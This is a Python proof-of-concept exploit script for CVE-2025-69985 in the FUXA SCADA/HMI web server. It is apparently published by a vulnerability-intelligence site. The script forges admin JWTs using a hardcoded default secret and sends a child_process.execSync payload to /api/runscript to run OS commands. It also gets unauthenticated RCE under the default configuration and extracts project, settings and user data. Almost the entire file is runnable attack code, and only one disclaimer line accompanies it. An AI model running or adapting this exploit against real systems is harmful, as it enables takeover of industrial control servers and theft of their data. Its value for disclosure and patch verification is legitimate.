#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : FUXA <= 1.2.11 Fix Bypass — JWT Forgery + Insecure Defaults
# CVE            : CVE-2025-69985
# Vendor         : frangoteam
# Product        : FUXA
# Affected       : All versions <= 1.2.11 (latest)
# Type           : CWE-288 - Authentication Bypass Using Alternate Path
# CVSS           : 9.8 (Critical)
# Platform       : Node.js / Docker
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-69985 Fix Bypass PoC — FUXA <= 1.2.11

Demonstrates THREE distinct bypass vectors against the "patched" version
(master branch, commit 427d2f63 and later):

BYPASS 1 — JWT Token Forgery via Hardcoded Secret (CRITICAL)
    The JWT signing secret defaults to 'frangoteam751' (hardcoded in
    server/api/jwt-helper.js line 6). Even with secureEnabled=true, an
    attacker can forge admin JWTs and achieve full RCE.

BYPASS 2 — Insecure Default Configuration (HIGH)
    The fix only works when secureEnabled=true, but the DEFAULT config
    ships with secureEnabled=false. All API endpoints are accessible
    without authentication.

BYPASS 3 — Information Disclosure via Guest Pass-through (MEDIUM)
    verifyToken never rejects requests. Guests can access /api/project,
    /api/settings, and /api/alarms without authentication.

PREREQUISITES:
  - Network access to FUXA instance on port 1881
  - Python 3 (stdlib only — falls back to manual JWT if PyJWT not installed)

REFERENCES:
  - CVE-2025-69985 / GHSA-4r4r-4jp4-wwf9
  - https://nvd.nist.gov/vuln/detail/CVE-2025-69985
"""

import sys
import json
import http.client
import argparse
import time

# Hardcoded default JWT secret from server/api/jwt-helper.js line 6
HARDCODED_SECRET = "frangoteam751"


def jwt_encode_hs256(payload, secret):
    """
    Minimal HS256 JWT encoder using only stdlib.
    Falls back to PyJWT if available, otherwise uses manual encoding.
    """
    try:
        import jwt as pyjwt
        return pyjwt.encode(payload, secret, algorithm="HS256")
    except ImportError:
        pass

    import base64
    import hashlib
    import hmac

    def b64url(data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))

    # Add expiry 1 hour from now
    payload_copy = dict(payload)
    payload_copy["iat"] = int(time.time())
    payload_copy["exp"] = int(time.time()) + 3600
    body = b64url(json.dumps(payload_copy))

    signing_input = f"{header}.{body}"
    sig = hmac.new(
        secret.encode("utf-8"),
        signing_input.encode("utf-8"),
        hashlib.sha256,
    ).digest()

    return f"{signing_input}.{b64url(sig)}"


def forge_admin_token(secret=HARDCODED_SECRET):
    """Forge a JWT with admin privileges using the known default secret."""
    payload = {
        "id": "admin",
        "groups": -1,  # -1 = admin group in FUXA
    }
    return jwt_encode_hs256(payload, secret)


def make_request(host, port, method, path, headers=None, body=None):
    """Make an HTTP request and return (status, response_body)."""
    conn = http.client.HTTPConnection(host, port, timeout=10)
    try:
        if body and isinstance(body, dict):
            body = json.dumps(body)
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        return resp.status, data
    except Exception as e:
        return None, str(e)
    finally:
        conn.close()


def rce_payload(command):
    """Build the /api/runscript RCE payload."""
    # Escape the command for embedding in JS string
    js_cmd = command.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')
    return {
        "params": {
            "script": {
                "test": True,
                "name": "exploit",
                "code": f'return require("child_process").execSync(\'{js_cmd}\').toString()',
                "parameters": [],
            }
        }
    }


def bypass1_jwt_forgery(host, port, command="id"):
    """
    BYPASS 1: JWT Token Forgery via Hardcoded Secret
    Works when secureEnabled=true on the patched version.
    """
    print()
    print("=" * 70)
    print("  BYPASS 1: JWT Token Forgery via Hardcoded Secret")
    print("  Target: PATCHED version with secureEnabled=true")
    print("=" * 70)
    print()
    print(f"[*] Target: http://{host}:{port}")
    print(f"[*] Command: {command}")
    print(f"[*] Hardcoded secret: {HARDCODED_SECRET}")
    print()

    # Step 1: Verify that normal requests are blocked
    print("[*] Step 1: Verify auth is enforced (no token)...")
    status, body = make_request(
        host,
        port,
        "POST",
        "/api/runscript",
        {"Content-Type": "application/json"},
        rce_payload(command),
    )
    print(f"    HTTP {status}: {body[:100]}")
    if status == 200:
        print("[!] WARNING: RCE worked WITHOUT bypass — auth may not be enabled")
        print("[!] This suggests secureEnabled=false (default config)")
        return True, body

    # Step 2: Forge admin JWT
    print()
    print("[*] Step 2: Forging admin JWT with hardcoded secret...")
    token = forge_admin_token()
    print(f"    Token: {token[:50]}...")

    # Step 3: Execute RCE with forged token
    print()
    print(f"[*] Step 3: Executing RCE with forged admin token...")
    status, body = make_request(
        host,
        port,
        "POST",
        "/api/runscript",
        {
            "Content-Type": "application/json",
            "x-access-token": token,
        },
        rce_payload(command),
    )
    print(f"    HTTP {status}")

    if status == 200:
        print()
        print("[+] SUCCESS — BYPASS CONFIRMED!")
        print("[+] Forged JWT with hardcoded secret achieved RCE on patched version!")
        print()
        print("=" * 70)
        print("  COMMAND OUTPUT")
        print("=" * 70)
        try:
            output = json.loads(body)
            print(output)
        except json.JSONDecodeError:
            print(body)
        print("=" * 70)
        return True, body
    else:
        print()
        print(f"[-] FAILED — HTTP {status}: {body[:200]}")
        return False, body


def bypass2_insecure_default(host, port, command="id"):
    """
    BYPASS 2: Direct RCE via Insecure Default Configuration
    Works when secureEnabled=false (the default shipping configuration).
    """
    print()
    print("=" * 70)
    print("  BYPASS 2: Direct RCE via Insecure Default (secureEnabled=false)")
    print("  Target: PATCHED version with DEFAULT configuration")
    print("=" * 70)
    print()
    print(f"[*] Target: http://{host}:{port}")
    print(f"[*] Command: {command}")
    print()

    # Direct RCE — no auth headers needed
    print("[*] Sending POST /api/runscript (no auth headers)...")
    status, body = make_request(
        host,
        port,
        "POST",
        "/api/runscript",
        {"Content-Type": "application/json"},
        rce_payload(command),
    )
    print(f"    HTTP {status}")

    if status == 200:
        print()
        print("[+] SUCCESS — BYPASS CONFIRMED!")
        print("[+] Default config allows unauthenticated RCE on patched version!")
        print()
        print("=" * 70)
        print("  COMMAND OUTPUT")
        print("=" * 70)
        try:
            output = json.loads(body)
            print(output)
        except json.JSONDecodeError:
            print(body)
        print("=" * 70)
        return True, body
    else:
        print()
        print(f"[-] RCE blocked (HTTP {status}) — secureEnabled may be true")
        print(f"    Response: {body[:200]}")
        return False, body


def bypass3_info_disclosure(host, port):
    """
    BYPASS 3: Information Disclosure via Guest Pass-through
    verifyToken never rejects — guests can access project data and settings.
    Works with secureEnabled=true or false.
    """
    print()
    print("=" * 70)
    print("  BYPASS 3: Information Disclosure via Guest Pass-through")
    print("  Target: PATCHED version (any secureEnabled value)")
    print("=" * 70)
    print()
    print(f"[*] Target: http://{host}:{port}")
    print()

    results = {}

    # Test 1: Project data (SCADA configs, devices)
    print("[*] GET /api/project (no auth)...")
    status, body = make_request(host, port, "GET", "/api/project")
    print(f"    HTTP {status}")
    if status == 200:
        try:
            data = json.loads(body)
            devices = data.get("devices", {})
            print(f"    [+] EXPOSED — {len(devices)} device(s) in project")
            results["project"] = "EXPOSED"
        except json.JSONDecodeError:
            print(f"    [+] EXPOSED — response: {body[:100]}")
            results["project"] = "EXPOSED"
    else:
        print(f"    [-] Blocked — {body[:100]}")
        results["project"] = "BLOCKED"

    # Test 2: Server settings (filesystem paths, config)
    print()
    print("[*] GET /api/settings (no auth)...")
    status, body = make_request(host, port, "GET", "/api/settings")
    print(f"    HTTP {status}")
    if status == 200:
        try:
            data = json.loads(body)
            print(f"    [+] EXPOSED — appDir: {data.get('appDir', 'N/A')}")
            print(f"    [+] EXPOSED — dbDir: {data.get('dbDir', 'N/A')}")
            print(f"    [+] EXPOSED — workDir: {data.get('workDir', 'N/A')}")
            results["settings"] = "EXPOSED"
        except json.JSONDecodeError:
            results["settings"] = "EXPOSED"
    else:
        results["settings"] = "BLOCKED"

    # Test 3: User enumeration
    print()
    print("[*] GET /api/users (no auth)...")
    status, body = make_request(host, port, "GET", "/api/users")
    print(f"    HTTP {status}")
    if status == 200:
        try:
            users = json.loads(body)
            if isinstance(users, list):
                print(f"    [+] EXPOSED — {len(users)} user(s)")
                for u in users:
                    print(f"        User: {u.get('username', 'N/A')}, Groups: {u.get('groups', 'N/A')}")
            results["users"] = "EXPOSED"
        except json.JSONDecodeError:
            results["users"] = "UNKNOWN"
    else:
        print(f"    [-] Blocked")
        results["users"] = "BLOCKED"

    # Test 4: Alarm data
    print()
    print("[*] GET /api/alarms (no auth)...")
    status, body = make_request(host, port, "GET", "/api/alarms")
    print(f"    HTTP {status}")
    results["alarms"] = "EXPOSED" if status == 200 else "BLOCKED"

    print()
    print("=" * 70)
    print("  INFORMATION DISCLOSURE SUMMARY")
    print("=" * 70)
    exposed = sum(1 for v in results.values() if v == "EXPOSED")
    total = len(results)
    for endpoint, status in results.items():
        marker = "[+]" if status == "EXPOSED" else "[-]"
        print(f"  {marker} /api/{endpoint}: {status}")
    print(f"\n  Total: {exposed}/{total} endpoints exposed to guests")
    print("=" * 70)

    return exposed > 0, results


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-69985 Fix Bypass PoC — FUXA Authentication Bypass"
    )
    parser.add_argument("host", help="Target host (IP or hostname)")
    parser.add_argument("port", type=int, help="Target port (default: 1881)")
    parser.add_argument(
        "--bypass",
        choices=["1", "2", "3", "all"],
        default="all",
        help="Bypass method to test (default: all)",
    )
    parser.add_argument(
        "--command",
        "-c",
        default="id",
        help='OS command to execute (default: "id")',
    )

    args = parser.parse_args()

    print()
    print("=" * 70)
    print("  CVE-2025-69985 FIX BYPASS PoC")
    print("  FUXA <= 1.2.11 — Multiple Authentication Bypass Vectors")
    print("=" * 70)
    print(f"  Target: http://{args.host}:{args.port}")
    print(f"  Bypass: {args.bypass}")
    print(f"  Command: {args.command}")

    results = {}

    if args.bypass in ("1", "all"):
        success, _ = bypass1_jwt_forgery(args.host, args.port, args.command)
        results["bypass1_jwt_forgery"] = success

    if args.bypass in ("2", "all"):
        success, _ = bypass2_insecure_default(args.host, args.port, args.command)
        results["bypass2_insecure_default"] = success

    if args.bypass in ("3", "all"):
        success, _ = bypass3_info_disclosure(args.host, args.port)
        results["bypass3_info_disclosure"] = success

    print()
    print("=" * 70)
    print("  OVERALL RESULTS")
    print("=" * 70)
    for name, success in results.items():
        marker = "[+] BYPASSED" if success else "[-] BLOCKED"
        print(f"  {marker}: {name}")
    print("=" * 70)

    bypassed = sum(1 for v in results.values() if v)
    if bypassed > 0:
        print(f"\n[!] {bypassed} bypass(es) confirmed — fix is INCOMPLETE")
    else:
        print(f"\n[*] No bypasses found — fix appears adequate")

    return 0 if bypassed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
